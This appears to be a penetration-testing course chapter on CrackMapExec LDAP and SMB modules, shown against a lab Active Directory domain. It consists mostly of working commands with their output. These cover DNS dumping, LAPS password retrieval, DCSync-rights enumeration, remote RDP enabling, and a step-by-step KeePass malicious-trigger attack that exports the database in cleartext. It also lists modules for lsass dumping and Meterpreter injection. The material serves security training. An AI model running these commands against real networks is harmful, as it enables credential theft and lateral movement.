# Popular Modules

One of the most exciting things about CrackMapExec is that it is modular and allows anyone to create modules and contribute them to the tool. CrackMapExec has more than 50 modules that enable us to perform operations to facilitate exploitation and post-exploitation tasks. This section will review some of these modules for the `LDAP` and `SMB` protocols.

***

## LDAP Protocol Modules

The LDAP protocol commonly allows us to interact with Domain Controllers and obtain information from them. Let's review some modules that will enable us to extract interesting information from Active Directory.

### LDAP Module - get-network

The module `get-network` is based on the [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump). By default, any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer. This tool enables the enumeration and exporting of all DNS records in the zone for recon purposes of internal networks.

We have three (3) ways to use the module: Retrieve only the IP address. Retrieve only the domain names. Retrieve both (IP and domain names).

By default, if we don't specify any option, the module will retrieve only the IP address. If we choose the option `ALL=true`, it will retrieve both IP and domain names, and if we specify `ONLY_HOSTS=true`, we will only retrieve the FQDN.

### **Getting Records from the DNS Server**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M get-network --options

[*] get-network module options:

            ALL      Get DNS and IP (default: false)
            ONLY_HOSTS    Get DNS only (no ip) (default: false)
```

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M get-network -o ALL=true

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
GET-NETW... dc01.inlanefreight.htb 389    DC01             [*] Querying zone for records
GET-NETW... dc01.inlanefreight.htb 389    DC01             [*] Using System DNS to resolve unknown entries. Make sure resolving your target domain works here or specify an IP as target host to use that server for queries
GET-NETW... dc01.inlanefreight.htb 389    DC01             Found 4 records
GET-NETW... dc01.inlanefreight.htb 389    DC01             [+] Dumped 4 records to /home/plaintext/.cme/logs/inlanefreight.htb_network_2022-12-13_065607.log
```

```shell-session
$ cat /home/plaintext/.cme/logs/inlanefreight.htb_network_2022-11-10_101113.log

dc01.inlanefreight.htb   10.129.203.121
test.inlanefreight.htb   172.16.1.39
database01.inlanefreight.htb     172.16.1.29
```

{% hint style="info" %}
**Note:** At the time of writing, the module has some differences with the `adidnsdump` tool. Results may be different from one account to another.
{% endhint %}

### **LAPS Module Retrieving Passwords**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M laps --options

[*] laps module options:

            COMPUTER    Computer name or wildcard ex: WIN-S10, WIN-* etc. Default: *
```

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M laps
SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LAPS        dc01.inlanefreight.htb 389    DC01             [*] Getting LAPS Passwords
LAPS        dc01.inlanefreight.htb 389    DC01             Computer: MS01$                Password: 7*vp5Nc8Ph7uR&
```

{% hint style="info" %}
**Note:** The password used is an example. It will not work against the target host.
{% endhint %}

### LDAP Module - MAQ

The Machine Account Quota (MAQ), represented by the attribute [MS-DS-Machine-Account-Quota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota), is a domain level attribute that by default indicates the number of computer accounts that a user is allowed to create in a domain.

There are a few attacks such as [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) that requires us to create a machine in the domain, and this is why it's essential to enumerate the account machine quota attribute.

### **Machine Quota Module**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u robert -p 'Inlanefreight01!' -M maq

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MAQ         dc01.inlanefreight.htb 389    DC01             [*] Getting the MachineAccountQuota
MAQ         dc01.inlanefreight.htb 389    DC01             MachineAccountQuota: 6
```

### LDAP Module - daclread

Another great module is `daclread`, which allows us to read and export the [DACLs](https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces) of one or multiple objects. This module will enable us to enumerate Active Directory access. It has the following options:

### **daclread Module Options**

```shell-session
$ crackmapexec ldap -M daclread --options

[*] daclread module options:

        Be carefull, this module cannot read the DACLS recursively. For example, if an object has particular rights because it belongs to a group, the module will not be able to see it directly, you have to check the group rights manually.
        TARGET          The objects that we want to read or backup the DACLs, sepcified by its SamAccountName
        TARGET_DN       The object that we want to read or backup the DACL, specified by its DN (usefull to target the domain itself)
        PRINCIPAL       The trustee that we want to filter on
        ACTION          The action to realise on the DACL (read, backup)
        ACE_TYPE        The type of ACE to read (Allowed or Denied)
        RIGHTS          An interesting right to filter on ('FullControl', 'ResetPassword', 'WriteMembers', 'DCSync')
        RIGHTS_GUID     A right GUID that specify a particular rights to filter on
```

Let's say we want to read all ACEs of the grace account. We can use the option `TARGET`, and the `ACTION` read:

### **Read Grace User's DACL**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u '' -p '' -M daclread -o TARGET=grace ACTION=read

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\:             
DACLREAD    dc01.inlanefreight.htb 389    DC01             Be carefull, this module cannot read the DACLS recursively.
DACLREAD    dc01.inlanefreight.htb 389    DC01             Target principal found in LDAP (CN=grace,CN=Users,DC=inlanefreight,DC=htb)
[*]  ACE[1] info                                                                               
[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE                                   
[*]    ACE flags                 : None                                                        
[*]    Access mask               : ReadProperty                                                
[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT                                     
[*]    Object type (GUID)        : User-Account-Restrictions (4c164200-20c0-11d0-a768-00aa006e0529)                                                                                           
[*]    Trustee (SID)             : RAS and IAS Servers (S-1-5-21-3325992272-2815718403-617452758-553)                                                                                         
[*]  ACE[2] info                                                                               
[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE                                   
[*]    ACE flags                 : None                                                        
[*]    Access mask               : ReadProperty                                                
[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT                                     
[*]    Object type (GUID)        : User-Logon (5f202010-79a5-11d0-9020-00c04fc2d4cf)           
[*]    Trustee (SID)             : RAS and IAS Servers (S-1-5-21-3325992272-2815718403-617452758-553)

<SNIP>
```

We can also look for specific rights, such as which principals have DCSync rights. We need to use the option `TARGET_DN` and specify the distinguished domain name (DN), the `ACTION` read, and the rights we want to look for with the option `RIGHTS`.

### **Searching for Users with DCSync Rights**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
DACLREAD    dc01.inlanefreight.htb 389    DC01             Be carefull, this module cannot read the DACLS recursively.
DACLREAD    dc01.inlanefreight.htb 389    DC01             Target principal found in LDAP (DC=inlanefreight,DC=htb)
[*]  ACE[3] info                
[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]    ACE flags                 : None
[*]    Access mask               : ControlAccess
[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*]    Trustee (SID)             : Domain Controllers (S-1-5-21-3325992272-2815718403-617452758-516)
[*]  ACE[4] info                
[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]    ACE flags                 : None
[*]    Access mask               : ControlAccess
[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*]    Trustee (SID)             : robert (S-1-5-21-3325992272-2815718403-617452758-2607)
[*]  ACE[17] info                
[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]    ACE flags                 : None
[*]    Access mask               : ControlAccess
[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*]    Trustee (SID)             : Administrators (S-1-5-32-544)
```

As shown in the output, the `ACE[4]` indicates that the user robert has DCSync rights in the target domain.

We can use a few more modules in `LDAP`. We can use the `-L` option to see the complete list of modules.

### **LDAP Protocol Modules**

```shell-session
$ crackmapexec ldap -L

[*] MAQ                       Retrieves the MachineAccountQuota domain-level attribute
[*] adcs                      Find PKI Enrollment Services in Active Directory and Certificate Templates Names
[*] daclread                  Read and backup the Discretionary Access Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be carefull, this module cannot read the DACLS recursively, more explains in the options.
[*] get-desc-users            Get description of the users. May contained password
[*] get-network               
[*] laps                      Retrieves the LAPS passwords
[*] ldap-checker              Checks whether LDAP signing and binding are required and / or enforced
[*] ldap-signing              Check whether LDAP signing is required
[*] subnets                   Retrieves the different Sites and Subnets of an Active Directory
[*] user-desc                 Get user descriptions stored in Active Directory
[*] whoami                    Get details of provided user
```

***

## SMB Protocol Modules

The `SMB` protocol has more modules available. Most of the stuff we have done in the CrackMapExec module uses the SMB protocol. Let's review some modules that will allow us to extract interesting information.

{% hint style="info" %}
**Note:** Most of the modules that use SMB need admin rights (`Pwned!`) to work.
{% endhint %}

### SMB Modules - get\_netconnections and ioxidresolver

When we are working on a network pentest, we are constantly looking to gain access to more resources or networks. CrackMapExec has some modules that will allow us to enumerate a machine we have already compromised and identify if it has more than one network configuration. Let's use the modules `get_netconnections` and `ioxidresolver` and see their differences.

The `get_netconnections` module uses WMI to query network connections. It retrieves all IP addresses, including IPv6 and any secondary IP, as well as the domain name.

### **get\_netconnections Module**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M get_netconnections

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
GET_NETC... 10.129.203.121  445    DC01             [+] IP Address: ['172.16.1.10', '172.16.2.50', 'fe80::3cd3:b51c:e8b9:b36f'] Search Domain: ['inlanefreight.htb', '.htb']
GET_NETC... 10.129.203.121  445    DC01             [+] IP Address: ['10.129.203.121']  Search Domain: ['inlanefreight.htb', '.htb']
GET_NETC... 10.129.203.121  445    DC01             [*] Saved raw output to network-connections-10.129.203.121-2022-11-14_115228.log
```

On the other hand, the `ioxidresolver` module uses RPC to query IP addresses. However, this module does not include IPv6 addresses.

### **ioxidresolver Module**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M ioxidresolver

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
IOXIDRES... 10.129.203.121  445    DC01             Address: 172.16.1.10
IOXIDRES... 10.129.203.121  445    DC01             Address: 172.16.2.50
IOXIDRES... 10.129.203.121  445    DC01             Address: 10.129.203.121
```

{% hint style="info" %}
**Note:** It is important to understand how a module works so we can pick the one that works best for our needs.
{% endhint %}

### SMB Module - keepass\_discover

KeePass is a free, open-source password manager commonly used in enterprise networks by admins and users to store passwords and secrets in one database. A master password protects it. If we get a KeePass database, we need its password to open it.

### **Discovering KeePass**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_discover

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121  445    DC01             Found process "KeePass" with PID 5004 (user INLANEFREIGHT\julio)
KEEPASS_... 10.129.203.121  445    DC01             Found C:\Users\julio\AppData\Roaming\KeePass\KeePass.config.xml
KEEPASS_... 10.129.203.121  445    DC01             Found C:\Users\julio\Application Data\KeePass\KeePass.config.xml
KEEPASS_... 10.129.203.121  445    DC01             Found C:\Users\julio\Documents\Database.kdbx
KEEPASS_... 10.129.203.121  445    DC01             Found C:\Users\julio\My Documents\Database.kdbx
```

An alternative if we don't have the master password is to use a technique developed by Lee Christensen ([@tifkin\_](https://twitter.com/tifkin_)) and Will Schroeder ([@harmj0y](https://twitter.com/harmj0y)) which makes use of KeePass' trigger system to export the database in cleartext. It modifies the KeePass configuration file to include a [trigger](https://keepass.info/help/v2/triggers.html) that automatically exports the database in clear text.

To use it, we need five (5) steps:

1. Locate the KeePass configuration file. We did this with the `keepass_discover` module.
2. Add the trigger to the configuration file using the option `ACTION=ADD` and the `KEEPASS_CONFIG_PATH`.

### **Adding Trigger to KeePass Configuration File**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=ADD 
KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml 

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121  445    DC01             [*] Adding trigger "export_database" to "C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml"
KEEPASS_... 10.129.203.121  445    DC01             [+] Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files
```

{% hint style="info" %}
**Note:** Make sure to use a backslash (/) or double slashes (\\\\) for the KeePass configuration path.
{% endhint %}

3. Wait for the user to open KeePass and enter the master password. To force this operation, we can use the option `ACTION=RESTART` to restart the KeePass.exe process. If the target machine has many users logged in, we can add the option `USER` with the username like this `USER=julio`.

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=RESTART

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121  445    DC01             [*] Restarting INLANEFREIGHT\julio's KeePass process
```

4. Poll the exported database to our machine using the option `ACTION=POLL`. We can then use `grep` to search for password entries.

### **Polling the Exported Data from the Compromised Target**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=POLL

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121  445    DC01             [*] Polling for database export every 5 seconds, please be patient
KEEPASS_... 10.129.203.121  445    DC01             [*] we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything

KEEPASS_... 10.129.203.121  445    DC01             [+] Found database export !
KEEPASS_... 10.129.203.121  445    DC01             [+] Moved remote "C:\Users\Public\export.xml" to local "/tmp/export.xml"
```

```shell-session
$ cat /tmp/export.xml | grep -i protectinmemory -A 5
                                        <Value ProtectInMemory="True">ForNewDCAnew92Pas#$$</Value>
                                </String>
                                <String>
                                        <Key>Title</Key>
                                        <Value>Administrator</Value>
                                </String>
```

5. Clean the configuration file using the option `ACTION=CLEAN` and the `KEEPASS_CONFIG_PATH`.

### **Clean Configuration File Changes**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=CLEAN KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml 

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] 
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121  445    DC01             [*] No export found in C:\Users\Public , everything is cleaned
KEEPASS_... 10.129.203.121  445    DC01             [*] Found trigger "export_database" in configuration file, removing
KEEPASS_... 10.129.203.121  445    DC01             [*] Restarting INLANEFREIGHT\julio's KeePass process
```

We learned each option for this module, but we can get it all at once with the `ACTION=ALL`. The good part of this option is that it includes the method extract\_password, which searches the .xml file for any password entry and prints it to the console.

### **Running keeppass\_trigger ALL in One Command**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml 

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y 
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121  445    DC01              
KEEPASS_... 10.129.203.121  445    DC01             [*] Adding trigger "export_database" to "C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml"
KEEPASS_... 10.129.203.121  445    DC01             [+] Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files
KEEPASS_... 10.129.203.121  445    DC01              
KEEPASS_... 10.129.203.121  445    DC01             [*] Restarting INLANEFREIGHT\julio's KeePass process
KEEPASS_... 10.129.203.121  445    DC01             [*] Polling for database export every 5 seconds, please be patient
KEEPASS_... 10.129.203.121  445    DC01             [*] we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything
...
KEEPASS_... 10.129.203.121  445    DC01             [+] Found database export !
KEEPASS_... 10.129.203.121  445    DC01             [+] Moved remote "C:\Users\Public\export.xml" to local "/tmp/export.xml"
KEEPASS_... 10.129.203.121  445    DC01              
KEEPASS_... 10.129.203.121  445    DC01             [*] Cleaning everything..
KEEPASS_... 10.129.203.121  445    DC01             [*] No export found in C:\Users\Public , everything is cleaned
KEEPASS_... 10.129.203.121  445    DC01             [*] Found trigger "export_database" in configuration file, removing
KEEPASS_... 10.129.203.121  445    DC01             [*] Restarting INLANEFREIGHT\julio's KeePass process
KEEPASS_... 10.129.203.121  445    DC01              
KEEPASS_... 10.129.203.121  445    DC01             [*] Extracting password..
KEEPASS_... 10.129.203.121  445    DC01             Notes : None
KEEPASS_... 10.129.203.121  445    DC01             Password : ForNewDCAnew92Pas#$$
KEEPASS_... 10.129.203.121  445    DC01             Title : Administrator
KEEPASS_... 10.129.203.121  445    DC01             URL : None
KEEPASS_... 10.129.203.121  445    DC01             UserName : Administrator

<SNIP>
```

{% hint style="info" %}
**Note:** The module may have issues while printing the password. We may get an error, but the password will be in the `/tmp/export.xml` file, so we can get it manually.
{% endhint %}

***

## Enabling or Disabling RDP

One common task we may want to do while assessing is to connect to a target machine via RDP. This can be useful in some scenarios where we can't perform any other type of lateral movement attacks or we want to go under the radar by using a standard protocol.

If the machine we want to connect doesn't have RDP enabled, we can use the module `RDP` to allow it. We need to specify the option `ACTION` followed by enable or disable.

### **Enabling RDP**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M rdp --options

[*] rdp module options:

            ACTION  Enable/Disable RDP (choices: enable, disable)
```

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M rdp -o ACTION=enable

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
RDP         10.129.203.121  445    DC01             [+] RDP enabled successfully
```

There are a few more modules in `SMB`. We can use the `-L` option to see the complete list of modules.

### **SMB Protocol Modules**

```shell-session
$ crackmapexec smb -L

[*] bh_owned                  Set pwned computer as owned in Bloodhound
[*] dfscoerce                 Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
[*] drop-sc                   Drop a searchConnector-ms file on each writable share
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the remote host(s) via WMI
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_netconnections        Uses WMI to query network connections.
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] handlekatz                Get lsass dump using handlekatz64 and parse the result with pypykatz
[*] hash_spider               Dump lsass recursively from a given hash using BH to find local admins
[*] impersonate               List and impersonate tokens to run command as locally logged on users
[*] install_elevated          Checks for AlwaysInstallElevated
[*] ioxidresolver             Thie module helps you to identify hosts that have additional active interfaces
[*] keepass_discover          Search for KeePass-related files and process.
[*] keepass_trigger           Set up a malicious KeePass trigger to export the database in cleartext.
[*] lsassy                    Dump lsass and parse the result remotely with lsassy
[*] masky                     Remotely dump domain user credentials via an ADCS and a KDC
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] ms17-010                  MS17-010, /!\ not tested oustide home lab
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] ntlmv1                    Detect if lmcompatibilitylevel on the target is set to 0 or 1
[*] petitpotam                Module to check if the DC is vulnerable to PetitPotam, credit to @topotam
[*] procdump                  Get lsass dump using procdump64 and parse the result with pypykatz
[*] rdp                       Enables/Disables RDP
[*] runasppl                  Check if the registry value RunAsPPL is set or not
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shadowcoerce              Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] spider_plus               List files on the target server (excluding `DIR` directories and `EXT` extensions) and save them to the `OUTPUT` directory if they are smaller then `SIZE`
[*] spooler                   Detect if print spooler is enabled or not
[*] teams_localdb             Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process
[*] test_connection           Pings a host
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
[*] webdav                    Checks whether the WebClient service is running on the target
[*] wireless                  Get key of all wireless interfaces
[*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472
```
